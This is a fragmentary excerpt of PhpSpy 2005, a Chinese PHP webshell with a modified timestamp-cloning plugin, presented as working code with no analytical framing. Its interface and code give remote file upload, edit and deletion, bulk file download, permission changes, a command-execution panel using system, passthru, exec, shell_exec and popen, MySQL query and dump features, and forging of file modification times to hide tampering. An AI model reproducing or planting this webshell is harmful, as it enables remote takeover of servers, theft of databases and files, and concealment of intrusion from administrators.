...
<body style="table-layout:fixed; word-break:break-all"><center><table width="760" border="0" cellpadding="3" cellspacing="0" bgcolor="#ffffff"><tr bgcolor="#cccccc"><td width="375" align="right" nowrap><b><?=$_SERVER['HTTP_HOST']?></b></td><td width="10" align="center" nowrap><b>:</b></td><td width="375" nowrap><b><?=$_SERVER['REMOTE_ADDR']?></b></td></tr><tr><td colspan="3" align="center" nowrap><a href="?action=logout">注销会话</a> | <a href="?action=dir">返回 PhpSpy 目录</a> | <a href="?action=phpenv">PHP环境变量</a><?=$phpinfo?><?=$shellmode?> | <a href="?action=sql">SQL Query</a> | <a href="?action=sqlbak">MySQL Backup</a> | <a href="http://www.4ngel.net" target="_blank" title="下载此程序">Version 2005</a></td></tr></table><hr width="760" noshade><table width="760" border="0" cellpadding="0"><form action="" method="GET"><tr><td><p>程序路径:<?=$pathname?><br>当前目录(<?=$dir_writeable?>,<?=substr(base_convert(@fileperms($nowpath),10,8),-4);?>):<?=$nowpath?><br>跳转目录:<input name="dir" type="text" class="INPUT"><input type="submit" class="INPUT" value="确定"> 〖支持绝对路径和相对路径〗</p></td></tr></form><form action="?dir=<?=urlencode($dir)?>" method="POST" enctype="multipart/form-data"><tr><td colspan="2">上传文件到当前目录:<input name="uploadmyfile" type="file" class="INPUT">	<input type="submit" name="uploadfile" class="INPUT" value="确定"><input type="hidden" name="uploaddir" value="<?=$dir?>"></td></tr></form><form action="?action=editfile&dir=<?=urlencode($dir)?>" method="POST"><tr><td colspan="2">新建文件在当前目录:<input name="newfile" type="text" class="INPUT" value=""><input type="submit" class="INPUT" name="createfile" value="确定"></td></tr></form><form action="" method="POST"><tr><td colspan="2">新建目录在当前目录:<input name="newdirectory" type="text" class="INPUT" value=""><input type="submit" class="INPUT" name="createdirectory" value="确定"></td></tr></form></table><hr width="760" noshade>
<?php
echo "<p><b>\n";
if(@$delfile!="") {
...
echo"鱼鱼纯洁的告诉你，你填写的参照".$_POST[file2]."素不存在滴，可素鱼鱼不生气！来，抱个好不好？";
}else{
if (@touch ("$file","$time","$time")) {
    print "Yeah，好开心的说，偶把".$file."的修改时间按".$_POST[file2]."改为了".$edittime."了诶。";
} else {
    print "不要啊，偶没有把时间修改成功，你不要离开我啊？555555555555555";
}
}
}
...
if (@touch ("$file","$edittime","$edittime")) {
    print "Yeah，好开心的说，偶把".$file."的修改时间".$_POST[file2]."改为了".$editdtime."了诶。";
} else {
    print "不要啊，偶没有把时间修改成功，你不要离开我啊？555555555555555";
}
}
...
?>
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff"><tr bgcolor="#cccccc"><td align="center" nowrap width="30%"><b>文件</b></td><td align="center" nowrap width="17%"><b>创建日期</b></td><td align="center" nowrap width="17%"><b>最后修改</b></td><td align="center" nowrap width="12%"><b>大小</b></td><td align="center" nowrap width="7%"><b>属性</b></td><td align="center" nowrap width="17%"><b>操作</b></td></tr>
<?php
$dirs=@opendir($dir);
...
while ($file=@readdir($dirs)) {
	...
	if($a=="0"){
		...
		echo "  <td align=\"center\" nowrap valign=\"top\"><a href=\"?downfile=".urlencode($filepath)."\">下载</a> | <a href=\"?action=editfile&dir=".urlencode($dir)."&editfile=".urlencode($file)."\">编辑</a> | <a href=\"?dir=".urlencode($dir)."&delfile=".urlencode($filepath)."\">删除</a> | <a href=\"?dir=".urlencode($dir)."&action=newtime&file=".urlencode($filepath)."\">修改时间</a> | </td>\n";
		echo "</tr>\n";
		$file_i++;
	}
}
@closedir($dirs); 
?>
<tr class="<?=getrowbg()?>"><td nowrap colspan="6"><table width="100%" border="0" cellpadding="2" cellspacing="0" align="center"><tr><td><INPUT onclick="CheckAll(this.form)" type="checkbox" value="on" name="chkall"> <input name="rarfile" type="text" class="INPUT" value="<?=$_SERVER['HTTP_HOST']?>_Files.rar"> <input type="submit" name="downrar" value="选中文件打包下载" class="INPUT"></td><td align="right"><?=$dir_i?> 个目录 / <?=$file_i?> 个文件</td></tr></table></td></tr></FORM></table>
<?php
}// end dir
...
?>
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff"><tr class="firstalt"><td align="center">新建/编辑文件 [<a href="?dir=<?=urlencode($dir)?>">返回</a>]</td></tr><form action="?dir=<?=urlencode($dir)?>" method="POST"><tr class="secondalt"><td align="center">当前文件:<input class="input" type="text" name="editfilename" size="30"
value="<?=$filename?>"> 输入新文件名则建立新文件</td></tr><tr class="firstalt"><td align="center"><textarea name="filecontent" cols="100" rows="20"><?=$contents?></textarea></td></tr><tr class="secondalt"><td align="center"><input type="submit" name="doeditfile" value="确定写入" class="input"><input type="reset" value="重置" class="input"></td></tr></form></table>
<?php
}//end editfile
elseif ($_GET['action'] == "shell") {
	if (!get_cfg_var("safe_mode")) {
?>
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff"><tr class="firstalt"><td align="center">WebShell Mode</td></tr><form action="?action=shell&dir=<?=urlencode($dir)?>" method="POST"><tr class="secondalt"><td align="center">提示:如果输出结果不完全,建议把输出结果写入文件.这样可以得到全部内容.</td></tr><tr class="firstalt"><td align="center">选择执行函数:<select name="execfunc" class="input"><option value="system" <? if ($execfunc=="system") { echo "selected"; } ?>>system</option><option value="passthru" <? if ($execfunc=="passthru") { echo "selected"; } ?>>passthru</option><option value="exec" <? if ($execfunc=="exec") { echo "selected"; } ?>>exec</option><option value="shell_exec" <? if ($execfunc=="shell_exec") { echo "selected"; } ?>>shell_exec</option><option value="popen" <? if ($execfunc=="popen") { echo "selected"; } ?>>popen</option></select>输入命令:<input type="text" name="command" size="60" value="<?=$_POST['command']?>" class="input"><input type="submit" value="execute" class="input"></td></tr><tr class="secondalt"><td align="center"><textarea name="textarea" cols="100" rows="25" readonly>
<?php
...
?>
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff"><form action="?dir=<?=urlencode($dir)?>" method="POST"><tr class="firstalt"><td align="center">删除 <input name="deldir" type="text" value="<?=$deldir?>" class="input" readonly> 目录</td></tr><tr class="secondalt"><td align="center">注意:如果该目录非空,此次操作将会删除该目录下的所有文件.您确定吗?</td></tr><tr class="firstalt"><td align="center"><input type="submit" name="rmdir" value="delete" class="input"></td></tr></form></table>
<?php
}//end deldir
elseif ($_GET['action'] == "newtime") {
?>
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff"><form action="?dir=<?=urlencode($dir)?>" method="POST"><tr class="secondalt"><td align="center">Clone time (克隆时间）by <a href="http://www.77yan.com" target="_blank">浅蓝的辐射鱼</a>@<a href="http://www.wwrsky.com" target="_blank">[F.S.T]</a></td></tr><tr class="secondalt"><td align="center">火狐的鱼鱼添加，修改文件时间的plus（akira，鱼好想你)</td></tr><tr class="firstalt"><td align="center">修改<input name="file" type="text" value="<?=$file?>" class="input" readonly>的修改时间</td></tr><tr class="secondalt"><td align="center">参照<input name="file2" type="text" class="input">来进行修改</td></tr><tr class="secondalt"><td align="center">注意:填写参照可以使用相对或绝对路径，例：e:/www/saiy.php或./saiy.php都是可以的！</td></tr><tr class="firstalt"><td align="center"><input name="action" type="hidden" value="newtime"><input type="submit" name="edittime" value="修改时间" class="input"></td></tr></form></table>
<hr>
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff"><tr class="firstalt"><td align="center">edit my time (自定义时间修改）by <a href="http://www.77yan.com" target="_blank">浅蓝的辐射鱼</a>@<a href="http://www.wwrsky.com" target="_blank">[F.S.T]</a> </td></tr><form action="?dir=<?=$dir?>" method="POST" enctype="multipart/form-data"><tr class="secondalt"><td align="center">提示:从1901年12月13日星期五的20:45:54 到2038年1月19日的星期二 03:14:07 为可接受域.</td></tr><tr class="firstalt"><td align="center">修改文件：<input name="file" type="text" value="<?=$file?>" class="input" readonly>的时间为<input type="text" name="year" size="4" value="2005" class="input">年
...
</select>份<input type="text" name="data" size="2" value="04" class="input">号<input type="text" name="hour" size="2" value="08" class="input">点<input type="text" name="minute" size="2" value="30" class="input">分<input type="text" name="second" size="2" value="30" class="input">秒
<input name="action" type="hidden" value="mytime">
<input type="submit" value="修改时间" class="input"></td></tr>
<tr class="secondalt"><td align="center">说明:月份后面的号取01到30之间，小时（几点）取0到24，分和秒取0到60之间！</td></tr></table></form>
<?php
}//end edittime
elseif ($_GET['action'] == "fileperm") {
?>
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff"><tr class="firstalt"><td align="center">修改文件属性 [<a href="?dir=<?=urlencode($dir)?>">返回</a>]</td></tr><form action="?dir=<?=urlencode($dir)?>" method="POST"><tr class="secondalt"><td align="center"><input name="file" type="text" value="<?=$file?>" class="input" readonly> 的属性为:<input type="text" name="fileperm" size="20" value="<?=substr(base_convert(fileperms($dir."/".$file),10,8),-4)?>" class="input"><input name="dir" type="hidden" value="<?=urlencode($dir)?>"><input type="submit" name="editfileperm" value="modify" class="input"></td></tr></form></table>
<?php
}//end fileperm
...
elseif ($_GET['action'] == "sqlbak") {
	...
	$dbname = isset($dbname) ? $dbname : '';
?>
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff"><tr class="firstalt"><td align="center">备份 MySQL 数据库</td></tr><form action="?action=sqlbak" method="POST"><tr class="secondalt"><td align="center">Host:<input name="servername" type="text" class="INPUT" value="<?=$servername?>">User:<input name="dbusername" type="text" class="INPUT" size="15" value="<?=$dbusername?>">Pass:<input name="dbpassword" type="text" class="INPUT" size="15" value="<?=$dbpassword?>">DB:<input name="dbname" type="text" class="INPUT" size="15" value="<?=$dbname?>"><input name="connect" type="submit" class="INPUT" value="连接"></td></tr>
<?php
	...
	?>
	<tr><td align="center" class="secondalt"><table border="0" cellpadding="3" cellspacing="1"><tr><td valign="top">请选择表:</td><td><select name="table[]" multiple size="15">
	<?php
	...
	?>
	</select></td></tr><tr nowrap><td>备份数据所保存的路径:</td><td><input type="text" class="INPUT" name="path" size="50" maxlength="50" value="./<?=$_SERVER['HTTP_HOST']?>_MySQL.sql"></td></tr></table></td></tr><tr><td align="center" class="firstalt"><input type="submit" name="dobackup" value="开始备份" class="INPUT"></td></tr>
	<?php
	}
	echo "  </form>\n";
	echo "</table>\n";
...
?>
<table width="760" border="0" align="center" cellpadding="3" cellspacing="1" bgcolor="#ffffff"><form action="?action=phpenv" method="POST"><tr class="firstalt"><td style="padding-left: 5px;"><b>查看PHP配置参数状况</b></td></tr><tr class="secondalt"><td style="padding-left: 5px;">请输入配置参数(如:magic_quotes_gpc):<input name="phpvarname" type="text" class="input" size="40"> <input type="submit" name="viewphpvar" value="查看" class="input"></td>
  </tr>
 </form>
<?php
	for($a=0;$a<3;$a++){
